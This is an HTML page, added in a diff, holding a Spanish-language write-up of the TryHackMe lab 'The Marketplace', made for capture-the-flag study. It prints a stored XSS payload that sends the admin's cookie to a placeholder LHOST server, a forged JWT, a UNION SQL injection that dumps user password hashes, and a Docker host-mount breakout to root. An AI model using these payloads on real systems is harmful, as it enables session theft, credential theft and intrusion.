@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - The Marketplace | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-info text-dark fs-6">TryHackMe</span>
+        <span class="badge bg-danger fs-6">Hard</span>
+        <span class="badge bg-secondary">Linux</span>
+        <span class="badge bg-secondary">XSS</span>
+        <span class="badge bg-secondary">SQLi</span>
+        <span class="badge bg-secondary">JWT</span>
+        <span class="badge bg-secondary">Docker</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">The Marketplace</h1>
+      <p class="text-secondary mb-3">XSS almacenado para robar cookie de admin, SQLi en panel de administración con JWT manipulado, y escalada via Docker.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-calendar3"></i> Jun 2023</span>
+        <span><i class="bi bi-clock"></i> ~90 min</span>
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">burp suite</span>
+        <span class="badge bg-dark border border-secondary p-2">sqlmap</span>
+        <span class="badge bg-dark border border-secondary p-2">jwt.io</span>
+        <span class="badge bg-dark border border-secondary p-2">docker</span>
+      </div>
+    </div>
+
+    <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Reconocimiento</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p 22,80 10.10.231.93</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>22/tcp open  ssh     OpenSSH 7.6p1
+80/tcp open  http    nginx 1.19.2 - The Marketplace</code></pre>
+      </div>
+      <p class="text-secondary">El sitio es un marketplace donde usuarios pueden publicar productos. El campo de descripción no sanitiza HTML.</p>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-lightning-charge"></i> XSS Almacenado → Cookie Hijacking</h4>
+      <p class="text-secondary">Creamos un producto con XSS en la descripción para robar la cookie del admin:</p>
+      <div class="code-block mb-3">
+        <pre><code>&lt;script&gt;
+  fetch('http://LHOST:8000/?c='+document.cookie)
+&lt;/script&gt;</code></pre>
+      </div>
+      <p class="text-secondary">Reportamos el producto al admin y esperamos la cookie:</p>
+      <div class="code-block mb-3">
+        <pre><code>python3 -m http.server 8000
+# Recibimos:
+GET /?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code></pre>
+      </div>
+      <p class="text-secondary">Decodificamos el JWT en jwt.io — cambiamos <code>"admin": false</code> a <code>"admin": true</code> y accedemos al panel.</p>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-code-slash"></i> SQL Injection en panel admin</h4>
+      <p class="text-secondary">El panel admin tiene el parámetro <code>?user=</code> vulnerable a SQLi:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>GET /admin?user=1' HTTP/1.1
+Cookie: token=&lt;JWT_MANIPULADO&gt;</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code># Error SQL visible — extraemos usuarios y contraseñas
+GET /admin?user=0 UNION SELECT 1,username,password,4 FROM users--</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>system:$6$hash...
+jake:$6$hash...</code></pre>
+      </div>
+      <p class="text-secondary">Crackeamos el hash de <code>jake</code> y nos conectamos por SSH.</p>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-arrow-up-right-circle"></i> Escalada — Docker</h4>
+      <p class="text-secondary">El usuario <code>michael</code> puede ejecutar un script como root que copia archivos dentro de un contenedor Docker. Lo abusamos para leer la clave SSH de root:</p>
+      <div class="code-block mb-3">
+        <pre><code>sudo /opt/backup.sh
+# Modificamos el script para copiar /root/.ssh/id_rsa
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code>whoami
+<span class="text-danger fw-bold">root</span></code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary">
+        <li>XSS almacenado en zonas que admin visualiza es crítico — siempre buscar funciones de "reportar" o "revisar".</li>
+        <li>Los JWT sin firma fuerte pueden ser manipulados para escalar privilegios en la aplicación.</li>
+        <li>Combinar XSS + SQLi + Docker breakout es una cadena de ataque completa muy común en CTFs Hard.</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
